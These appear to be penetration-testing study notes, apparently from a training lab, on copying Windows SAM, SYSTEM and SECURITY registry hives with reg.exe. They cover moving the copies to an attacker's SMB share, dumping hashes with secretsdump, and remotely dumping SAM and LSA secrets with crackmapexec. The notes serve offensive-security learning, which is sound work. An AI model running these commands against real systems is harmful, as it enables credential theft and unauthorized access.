# Copying SAM Registry Hives
**What we need?**<br>
-Local admin user with password from windows target

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:

![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/ffec8edc-1f07-4ad2-b0d6-ff610b1a97fb)
We can create backups of these hives using the reg.exe utility.

We have to launch cmd as admin in order to copy hives:
Commands to copy:
```bash
reg.exe save hklm\sam C:\sam.save
```
```bash
reg.exe save hklm\system C:\system.save
```
```bash
reg.exe save hklm\security C:\security.save
```
Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.

## Transfer file
We can create ftp, http or smb server to transfer these files to our linux machine.

**Transfering to smb share from windows:**
`move sam.save \\IP\sharename` same for system.save and security.save

## Dumping hashes from linux using hives:

We will use secretsdump from `/usr/share/doc/python3-impacket/examples`:
```bash
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```
Fromat: `Dumping local SAM hashes (uid:rid:lmhash:nthash)`


# Remote Dumping & LSA Secrets Considerations
With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network
```bash
crackmapexec smb 10.129.42.198 --local-auth -u user -p password --lsa
```
## Dumping SAM Remotely
```bash
crackmapexec smb 10.129.42.198 --local-auth -u user -p password --sam
```
